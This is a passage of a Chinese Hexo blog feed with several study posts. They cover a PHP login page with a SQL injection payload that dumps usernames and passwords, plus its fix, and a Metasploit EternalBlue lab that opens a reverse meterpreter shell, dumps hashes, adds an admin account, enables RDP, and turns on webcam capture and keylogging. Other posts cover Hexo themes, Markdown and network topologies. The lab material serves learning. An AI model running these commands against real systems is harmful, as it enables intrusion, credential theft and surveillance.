//login为在div标签中创建的类<br>.flex1&#123;&#125;   //flex1为div标签创建的布置login的类<br>.login-top&#123;&#125;   //login-top是flex1中login页面的头部类<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2.png" alt="登录页面"></p><h3 id="使用sql注入实现免密码登录"><a href="#使用sql注入实现免密码登录" class="headerlink" title="使用sql注入实现免密码登录"></a>使用sql注入实现免密码登录</h3><p>在未对sql注入进行防范时将*1’ union select 1,database(),(group_concat(id,0x7e,username,0x7e,password)) from security.users– -*语句</p><p>输入在用户名的文本框里可以查询出<em>security</em>数据库中的<em>id,username,password</em>信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgsql%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png" alt="sql注入成功"></p><p>显示了需要的信息。</p><p>修改后的代码就无法注入成功。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E4%BB%A3%E7%A0%81.png" alt="修改后的代码"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%97%A0%E6%B3%95sql%E6%B3%A8%E5%85%A5.png" alt="无法sql注入"></p><h3 id="补全漏洞"><a href="#补全漏洞" class="headerlink" title="补全漏洞"></a>补全漏洞</h3><p>下图为上传文件和评论功能的截图</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%8A%E4%BC%A0%E6%A1%86.png" alt="上传框"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%AF%84%E8%AE%BA.png" alt="评论"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$random_name</span> = <span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$file_name</span>;   <span class="hljs-comment">//随时间随机生成文字在文件名前</span><br><span class="hljs-variable">$target_path</span> = <span class="hljs-variable">$upload_dir</span>.<span class="hljs-string">&quot;\\&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random_name</span>).<span class="hljs-variable">$file_name</span>;  <span class="hljs-comment">//将随机的文件名用MD5编码放置在upload文件根目录下</span><br><span class="hljs-variable">$comment</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;comment&#x27;</span>]); <span class="hljs-comment">// 使用htmlspecialchars语句防止 XSS 攻击</span><br><span class="hljs-variable">$comment</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$comment</span>); <span class="hljs-comment">// 转义评论，防止 SQL 注入</span><br><br><br><br></code></pre></td></tr></table></figure><p>主页代码</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%BB%E9%A1%B5%E4%BB%A3%E7%A0%81.png" alt="主页代码"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用php写页面</title>
    <link href="/2023/11/13/%E4%BD%BF%E7%94%A8php%E5%86%99%E9%A1%B5%E9%9D%A2/"/>
    <url>/2023/11/13/%E4%BD%BF%E7%94%A8php%E5%86%99%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="配置php环境"><a href="#配置php环境" class="headerlink" title="配置php环境"></a>配置php环境</h3><p>下载<em>phpstudy</em>，先更改php的版本为php5.5.9nts，再将网站中的目录索引打开。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpstudy.png" alt="phpstudy"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%94%B9php%E7%89%88%E6%9C%AC.png" alt="改php版本"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%B4%A2%E5%BC%95.png" alt="索引"></p><p>最后将<em>apache2.4.39和mysql5.7.26</em>启动就可应将写的php文件部署到本机了。</p><hr><h3 id="编写php网页"><a href="#编写php网页" class="headerlink" title="编写php网页"></a>编写php网页</h3><p>1.编写登录页面，新建文本文件将其重命名为<em>index.php</em>,输入！（英文）再输入回车将php页面格式化。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A0%87%E5%87%86.png" alt="标准"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A0%BC%E5%BC%8F%E5%8C%96php.png" alt="格式化php"></p><p>将body中填入所需的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;link.php&quot;</span>&gt;  <span class="hljs-comment">//表单标签  method属性是表示传输方式 action属性表示传输的地址</span><br>&lt;title&gt;&lt;/title&gt;  <span class="hljs-comment">//title表示网页的名字</span><br>&lt;tr&gt;&lt;/tr&gt;  <span class="hljs-comment">//tr表示一个表格的一行</span><br>&lt;td&gt;&lt;/td&gt;  <span class="hljs-comment">//td表示一行中的一个</span><br>&lt;input type= name= value= &gt;&lt;/input&gt; <span class="hljs-comment">//input是表单中的输出元素 type表示类型 name表示名字 value表示值</span><br>&lt;br&gt;  <span class="hljs-comment">//br为换行标签</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>td1</th><th>td2</th></tr></thead><tbody><tr><td>td3</td><td>td4</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%99%BB%E5%BD%95%E9%A1%B5.png" alt="登录页"></p><p>2.编写链接页</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9E%E6%8E%A5%E9%A1%B5.png" alt="连接页"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-comment">//输出所接的语句</span><br>header <span class="hljs-comment">//进入页面</span><br>$ <span class="hljs-comment">//变量</span><br>trim   <span class="hljs-comment">//去除空格</span><br></code></pre></td></tr></table></figure><p>3.主页设置</p><p>设置登录成功界面信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%BB%E9%A1%B5.png" alt="主页"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用永恒之蓝漏洞进入win7</title>
    <link href="/2023/11/11/%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5win7/"/>
    <url>/2023/11/11/%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5win7/</url>
    
    <content type="html"><![CDATA[<p>192.168.0.32（桥接机的地址）</p><h3 id="准备两台虚拟机“win7”和“kali-Linux”"><a href="#准备两台虚拟机“win7”和“kali-Linux”" class="headerlink" title="准备两台虚拟机“win7”和“kali Linux”"></a>准备两台虚拟机“win7”和“kali Linux”</h3><p>使用VMware新建两台虚拟机（win7和kali Linux），两台机器的网络适配器均设置为<strong>nat模式</strong><br>再开启指令运行器使用<em>ifcongfig</em>查看Linux系统的IP地址（192.168.73.130）<strong>注意： 需将win7的防火墙关闭，否则攻击可能失败。</strong></p><p>打开靶机（win7）命令处理程序（win+r，输入cmd），使用<em>ipconfig</em>查看靶机的IP地址（192.168.73.131）。</p><hr><h3 id="利用ms-17-010攻击靶机"><a href="#利用ms-17-010攻击靶机" class="headerlink" title="利用ms 17_010攻击靶机"></a>利用ms 17_010攻击靶机</h3><p>在Linux中运行指令（kali用户）msfconsole 进入msf</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111153207384.png" alt="image-20231111153207384"></p><p>出现上图所示就表示msf启动成功。</p><p>进入msf后用search ms17_010查找可使用的msf模块，然后根据需要的模块使用功能如：<br>auxiliary模块(查看模块)，exploit模块（攻击模块）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgms17_010%E7%9A%84%E5%8A%9F%E8%83%BD.png" alt="ms17_010的功能"></p><p>使用use auxiliary语句选择auxiliary模块，使用show options展示本机的各项参数 ： </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgauxiliary%E6%A8%A1%E5%9D%97%E6%9F%A5%E7%9C%8B%E8%AE%BE%E7%BD%AE.png" alt="auxiliary模块查看设置"></p><p>再使用语句 <em>set rhosts 192.168.73.0&#x2F;24</em>扫描该网段的主机，使用<em>set threads 100</em> 设置扫描的速度（值越大速度越快），最后<em>run</em>执行扫描。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%AB%E6%8F%8F192.168.73.131%E7%9A%84%E9%9D%B6%E6%9C%BA.png" alt="扫描192.168.73.131的靶机"></p><p>寻找号可攻击的靶机后，use 0 使用攻击mokuai</p><p>设置攻击目标（靶机）：set rhost 192.168.100.128</p><p>设置监听主机（kali）：set lhost 192.168.100.100</p><p>设置攻击载荷：set payload  windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p>利用exploit进行攻击：run或者exploit</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111162324402.png" alt="image-20231111162324402"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111162355895.png" alt="image-20231111162355895"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB.png" alt="进行攻击"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt="攻击成功"></p><p>显示“win”表示攻击成功，否则需查看之前的操作是否正确。</p><hr><h3 id="对靶机进行渗透"><a href="#对靶机进行渗透" class="headerlink" title="对靶机进行渗透"></a>对靶机进行渗透</h3><h4 id="1-使用sysinfo查询靶机信息"><a href="#1-使用sysinfo查询靶机信息" class="headerlink" title="1.使用sysinfo查询靶机信息"></a>1.使用<em>sysinfo</em>查询靶机信息</h4><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%98%BE%E7%A4%BA%E9%9D%B6%E6%9C%BA%E7%9A%84%E4%BF%A1%E6%81%AF.png" alt="显示靶机的信息"></p><p>使用<em>shell</em>获得管理员权限</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgshell%E6%8C%87%E4%BB%A4.png" alt="shell指令"></p><p>须知win系统和Linux系统的编码方式不同需要改变编码否者会出现乱码，使用以下指令更改编码方式： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span> //utf-<span class="hljs-number">8</span>编码<br><span class="hljs-attribute">chcp</span> <span class="hljs-number">936</span> //gbk编码<br></code></pre></td></tr></table></figure><h4 id="2-拍摄快照"><a href="#2-拍摄快照" class="headerlink" title="2.拍摄快照"></a>2.拍摄快照</h4><p>使用<em>exit</em>退出win7系统，在meterpreter使用<em>screenshot</em>拍摄靶机快照</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot%E6%8B%8D%E6%91%84%E5%BF%AB%E7%85%A7.png" alt="screenshot拍摄快照"></p><p>然后在所在地址就可以找到快照。</p><h4 id="3-上传文件到靶机和下载靶机的文件"><a href="#3-上传文件到靶机和下载靶机的文件" class="headerlink" title="3.上传文件到靶机和下载靶机的文件"></a>3.上传文件到靶机和下载靶机的文件</h4><p>upload 要上传的文件路径（主机文件） 存储路径（靶机地址）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgupload.png" alt="upload"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%8E%A5%E6%94%B6.png" alt="接收"></p><p><strong>注意：windows系统不区分大小写而Linux系统会区分大小写，且路径文件名不要打错。</strong></p><p>download 下载文件路径（靶机文件） 存储文件地址（主机地址）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgdownload.png" alt="download"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%8B%E8%BD%BD%E6%88%90%E5%8A%9F.png" alt="下载成功"></p><h4 id="4-获取靶机的账户和密码"><a href="#4-获取靶机的账户和密码" class="headerlink" title="4.获取靶机的账户和密码"></a>4.获取靶机的账户和密码</h4><p>利用刚拿到的<em>shell</em>执行权限提权，通过<em>shell</em>对靶机Win7进行控制</p><p>此时我们输入<em>getuid</em>查看权限得知权限为管理员权限</p><p>使用<em>shell</em>命令进入window7系统</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E8%B4%A6%E6%88%B7%E5%92%8C%E5%AF%86%E7%A0%81%E7%9A%84%E5%93%88%E5%B8%8C%E5%80%BC.png" alt="获取靶机账户和密码的哈希值"></p><p>将哈希序列放在网站<a href="https://www.cmd5.com/">https://www.cmd5.com</a>上解析。</p><p>注：msf 在获取 shell 后为了更方便的进行渗透测试，可获取主机的 hash 以及域的 hash，即用户的密码，存在于 c 盘下的 windos 下的 system32 下的 config 下的 sam 文件中，以 hash 加密的方式存储，而系统开机后，hash 密码会以明文存在于内存中。</p><h4 id="5-新增靶机账户并远程登录靶机"><a href="#5-新增靶机账户并远程登录靶机" class="headerlink" title="5.新增靶机账户并远程登录靶机"></a>5.新增靶机账户并远程登录靶机</h4><p>使用<em>shell</em>命令进入window7系统，此时我们输入<em>getuid</em>查看权限得知权限为管理员权限</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">net user <span class="hljs-string">//</span>查看用户<br>net user 123 passwd <span class="hljs-string">/add</span> <span class="hljs-string">//</span>添加123用户并将密码设置成passwd<br>net localgroup administrators 123 <span class="hljs-string">/add</span> <span class="hljs-string">//</span>将123用户添加到administrators组（管理员），以提高123用户的权限<br>net user admin <span class="hljs-string">/active</span><span class="hljs-function">:yes</span>   <span class="hljs-string">//</span>开启远程管理服务<br>reg add<br><span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 0 <span class="hljs-string">/f</span>  <span class="hljs-string">//</span>在CMD命令行开启3389端口<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7.png" alt="查看用户"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111173551295.png" alt="image-20231111173551295"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231111173600702.png" alt="image-20231111173600702"></p><h4 id="6-开启摄像头"><a href="#6-开启摄像头" class="headerlink" title="6.开启摄像头"></a>6.开启摄像头</h4><p>webcam_list –&gt;查看摄像头</p><p>webcam_snap –&gt;通过摄像头拍照</p><p>webcam_stream –&gt;通过摄像头开启视频</p><h4 id="7-键盘监听"><a href="#7-键盘监听" class="headerlink" title="7.键盘监听"></a>7.键盘监听</h4><p>ps 看（explorer.exe）进程号</p><p>migrate 1892（进程号） 迁移</p><p>keyscan_start 键盘监听</p><p>keyscan_dump 看键盘输入了什么</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>配置github的主题</title>
    <link href="/2023/11/09/%E9%85%8D%E7%BD%AEgithub%E7%9A%84%E4%B8%BB%E9%A2%98/"/>
    <url>/2023/11/09/%E9%85%8D%E7%BD%AEgithub%E7%9A%84%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="选择hexo主题"><a href="#选择hexo主题" class="headerlink" title="选择hexo主题"></a>选择hexo主题</h3><p>在浏览器中搜索hexo主题，选择喜欢的主题。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imghexo%E4%B8%BB%E9%A2%98.png" alt="hexo主题"></p><p>下载所选择的主题的代码解压到博客的themes文件夹中，以fluid主题为例，在博客的根目录下git bash</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%8D%9A%E5%AE%A2git.png" alt="博客git"></p><p>执行命令</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>然后将解压的文件重命名为fluid，再如下修改 Hexo 博客目录中的 <code>_config.yml</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid  <span class="hljs-meta"># 指定主题</span><br><br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN  <span class="hljs-meta"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p>最后部署在博客上就可以显示主题了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown语法及网络的配置</title>
    <link href="/2023/11/08/markdown%E8%AF%AD%E6%B3%95%E5%8F%8A%E7%BD%91%E7%BB%9C%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/11/08/markdown%E8%AF%AD%E6%B3%95%E5%8F%8A%E7%BD%91%E7%BB%9C%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Markdown语法"><a href="#Markdown语法" class="headerlink" title="Markdown语法"></a>Markdown语法</h1><h3 id="标题的大小"><a href="#标题的大小" class="headerlink" title="标题的大小"></a>标题的大小</h3><p>在Markdown语法中标题有6种大小并以#号作为区分，如： 一级标题就只有一个#，二级标题就有两个#号以此类推</p><h3 id="字体型号"><a href="#字体型号" class="headerlink" title="字体型号"></a>字体型号</h3><p>Markdown语法以字的左右两边的*号或_符号进行区分，其中两边各有一个为斜体——<em>斜体</em>，两边各有两个为粗体——<strong>粗体</strong> ，两边各有三个为粗斜体——<em><strong>粗斜体</strong></em> 。</p><h3 id="分格线"><a href="#分格线" class="headerlink" title="分格线"></a>分格线</h3><p>可以用三个或以上的***或___或在其中添加空格实现分格线。</p><hr><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><p>在文字两边各两个~~号生成删除线，<del>删除线</del>。</p><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><p>可使用HTML的&lt;u&gt;标签实现下划线，<u>下划线</u></p><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><p>脚注使用[^github]打出，<a href="%E4%B8%80%E4%B8%AA%E5%BC%80%E6%BA%90%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E3%80%82">^github</a></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>Markdown 支持有序列表和无序列表。</p><p><strong>无序列表</strong>使用星号(<em>****)、加号(<strong>+</strong>)或是减号(</em>*-**)作为列表标记，这些标记后面要添加一个空格，然后再填写内容： </p><ul><li>一</li><li>二</li></ul><p><strong>有序列表</strong>使用数字并加上 <strong>.</strong> 号来表示，如： </p><ol><li>F</li><li>S</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>如果是段落上的一个函数或片段的代码可以用反引号把它包起来（**&#96;**），例如： </p><p><code>printf()</code> 函数</p><p>你也可以用 <strong>&#96;&#96;&#96;</strong> 包裹一段代码，并指定一种语言（也可以不指定）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c+">printf(&quot;这是一条语句。&quot;)；<br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>可以使用[链接名](链接地址)或&lt;链接地址&gt;直接表示链接，如： </p><p><a href="https://www.baidu.com/">百度</a>或<a href="http://www.baidu.com/">http://www.baidu.com</a></p><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>可直接将图片托入Typora，再使用PicGo上传到github博客中。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgQQ%E6%88%AA%E5%9B%BE20231107200407.png"></p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>使用|表头|表头|</p><p>​        |——|—–|</p><p>​         |        |      |</p><p>格式建立表格。</p><table><thead><tr><th>表头</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="转义文字"><a href="#转义文字" class="headerlink" title="转义文字"></a>转义文字</h3><p>如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符： </p><p><strong>文本加粗</strong><br>** 正常显示星号 **</p><p>支持以下这些符号前面加上反斜杠来帮助插入普通的符号：  </p><p>\   反斜线<br>&#96;   反引号</p><ul><li><p>星号<br>_   下划线<br>{}  花括号<br>[]  方括号<br>()  小括号</p><p>#  井子号</p><p>+   加号</p><p>-    减号<br>.   英文句点<br>!   感叹号</p></li></ul><h3 id="PicGo的使用"><a href="#PicGo的使用" class="headerlink" title="PicGo的使用"></a>PicGo的使用</h3><p>配置PicGo</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgQQ%E6%88%AA%E5%9B%BE20231109093120.png" alt="QQ截图20231109093120"></p><p>其中图床配置名可以自由设置，设定仓库名必须配置“GitHub用户名\自己创建的库的名字”，设定分支名基本为main，设定Token需要打开github中的Settings，找到</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot20231109.png" alt="screenshot20231109"></p><p>按如下操作： </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot20231109%20(3).png" alt="screenshot20231109 (3)"></p><p>再选择<strong>无限时间</strong>，<strong>勾选repo</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgscreenshot20231109%20(5).png" alt="screenshot20231109 (5)"></p><hr><p>设定自定义域名格式（cdn）： <a href="https://cdn.jsdelivr.net/gh/%E4%BD%A0%E7%9A%84github%E7%94%A8%E6%88%B7%E5%90%8D/%E4%BD%A0%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D@%E5%88%86%E6%94%AF%EF%BC%88%E4%B8%80%E8%88%AC%E4%B8%BAmain%EF%BC%89/">https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@分支（一般为main）/</a></p><p>将设置都调整好后，点击保存。将图片上传到github上只需要将图片拖入Typora中在将点击上传图片即可。最后将Typora的文件<strong>部署</strong>到github上就可以在博客上看到图片了。</p><h1 id="网络的配置"><a href="#网络的配置" class="headerlink" title="网络的配置"></a>网络的配置</h1><h3 id="常见的网络拓扑结构"><a href="#常见的网络拓扑结构" class="headerlink" title="常见的网络拓扑结构"></a>常见的网络拓扑结构</h3><h3 id="1-总线型网络拓扑结构"><a href="#1-总线型网络拓扑结构" class="headerlink" title="1.总线型网络拓扑结构"></a>1.总线型网络拓扑结构</h3><p>总线型结构是将网络中的所有设备通过相应的硬件接口直接连接到公共总线上，结点之间按广播方式通信，一个结点发出的信息，总线上的其它结点均可“收听”到。 总线型结构就像一张树叶,有一条主干线,主干线上面由很多分支。总线型拓扑结构图如下: </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%80%BB%E7%BA%BF%E6%8B%93%E6%89%91.png" alt="总线拓扑"></p><p><strong>总线型拓扑结构的网络特点如下</strong>：</p><ul><li>结构简单，可扩充性好；</li><li>当需要增加节点时，只需要在总线上增加一个分支接口便可与分支节点相连，当总线负载不允许时还可以扩充总线；</li><li>使用的电缆少，且安装容易；</li><li>使用的设备相对简单，可靠性高；</li><li>维护难，分支节点故障查找难。</li></ul><p><strong>总线型拓扑结构的结构特点如下</strong>：</p><ul><li>组网费用低：从示意图可以这样的结构根本不需要另外的互联设备，是直接通过一条总线进行连接，所以组网费用较低；</li><li>这种网络因为各节点是共用总线带宽的，所以在传输速度上会随着接入网络的用户的增多而下降；</li><li>网络用户扩展较灵活：需要扩展用户时只需要添加一个接线器即可，但所能连接的用户数量有限；</li><li>维护较容易：单个节点失效不影响整个网络的正常通信。但是如果总线一断，则整个网络或者相应主干网段就断了。</li><li>这种网络拓扑结构的缺点是一次仅能一个端用户发送数据，其它端用户必须等待到获得发送权</li></ul><h3 id="2-星型网络拓扑结构"><a href="#2-星型网络拓扑结构" class="headerlink" title="2.星型网络拓扑结构"></a>2.星型网络拓扑结构</h3><p>星型结构是一种以中央节点为中心，把若干外围节点连接起来的辐射式互联结构。这种结构适用于局域网，特别是近年来连接的局域网大都采用这种连接方式。这种连接方式以双绞线或同轴电缆作连接线路。星型拓扑结构图如下: </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%98%9F%E5%9E%8B%E6%8B%93%E6%89%91.png" alt="星型拓扑"></p><p><strong>星型拓扑结构的结构特点如下</strong>：</p><ul><li>控制简单。任何一站点只和中央节点相连接，因而介质访问控制方法简单，致使访问协议也十分简单。易于网络监控和管理。</li><li>故障诊断和隔离容易。中央节点对连接线路可以逐一隔离进行故障检测和定位，单个连接点的故障只影响一个设备，不会影响全网。</li><li>方便服务。中央节点可以方便地对各个站点提供服务和网络重新配置。</li></ul><p>总的来说星型拓扑结构相对简单，便于管理，建网容易，是目前局域网普采用的一种拓扑结构。采用星型拓扑结构的局域网，一般使用双绞线或光纤作为传输介质，符合综合布线标准，能够满足多种宽带需求。</p><p>尽管物理星型拓扑的实施费用高于物理总线拓扑，然而星型拓扑的优势却使其物超所值。每台设备通过各自的线缆连接到中心设备，因此某根电缆出现问题时只会影响到那一台设备，而网络的其他组件依然可正常运行。这个优点极其重要，这也正是所有新设计的以太网都采用的物理星型拓扑的原因所在。</p><h3 id="3-环形网络拓扑结构"><a href="#3-环形网络拓扑结构" class="headerlink" title="3.环形网络拓扑结构"></a>3.环形网络拓扑结构</h3><p>环形结构各结点通过通信线路组成闭合回路，环中数据只能单向传输，信息在每台设备上的延时时间是固定的，特别适合实时控制的局域网系统。环形结构就如一串珍珠项链,环形结构上的每台计算机就是项链上的一个个珠子。环形拓扑结构图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%8E%AF%E5%BD%A2%E6%8B%93%E6%89%91.png" alt="环形拓扑"></p><p>实际上大多数情况下这种拓扑结构的网络不会是所有计算机真的要连接成物理上的环型，一般情况下，环的两端是通过一个阻抗匹配器来实现环的封闭的，因为在实际组网过程中因地理位置的限制不方便真的做到环的两端物理连接。</p><p><strong>环型拓扑结构的网络特点如下</strong>：</p><ul><li>信息流在网中是沿着固定方向流动的，两个节点仅有一条道路，故简化了路径选择的控制；</li><li>环路上各节点都是自主控制，故控制软件简单；</li><li>由于信息源在环路中是串行地穿过各个节点，当环中节点过多时，势必影响信息传输速率，使网络的响应时间延长；</li><li>环路是封闭的，不便于扩充；</li><li>可靠性低，一个节点故障，将会造成全网瘫痪；</li><li>维护难，对分支节点故障定位较难。</li></ul><p><strong>环型拓扑结构的结构特点如下</strong>：</p><ul><li>一般仅适用于IEEE 802.5的令牌网(Token ring network)，在这种网络中，”令牌”是在环型连接中依次传递。所用的传输介质一般是同轴电缆。</li><li>网络实现也非常简单，投资最小。可以从其网络结构示意图中看出，组成这个网络除了各工作站就是传输介质–同轴电缆，以及一些连接器材，没有价格昂贵的节点集中设备，如集线器和交换机。但也正因为这样，所以这种网络所能实现的功能最为简单，仅能当作一般的文件服务模式；</li><li>传输速度较快：在令牌网中允许有16Mbps的传输速度，它比普通的10Mbps以太网要快许多。当然随着以太网的广泛应用和以太网技术的发展，以太网的速度也得到了极大提高，目前普遍都能提供100Mbps的网速，远比16Mbps要高。</li><li>维护困难：从其网络结构可以看到，整个网络各节点间是直接串联，这样任何一个节点出了故障都会造成整个网络的中断、瘫痪，维护起来非常不便。另一方面因为同轴电缆所采用的是插针式的接触方式，所以非常容易造成接触不良，网络中断，而且这样查找起来非常困难，这一点相信维护过这种网络的人都会深有体会。</li><li>扩展性能差：也是因为它的环型结构，决定了它的扩展性能远不如星型结构的好，如果要新添加或移动节点，就必须中断整个网络，在环的两端作好连接器才能连接。</li></ul><h3 id="4-树型网络拓扑结构"><a href="#4-树型网络拓扑结构" class="headerlink" 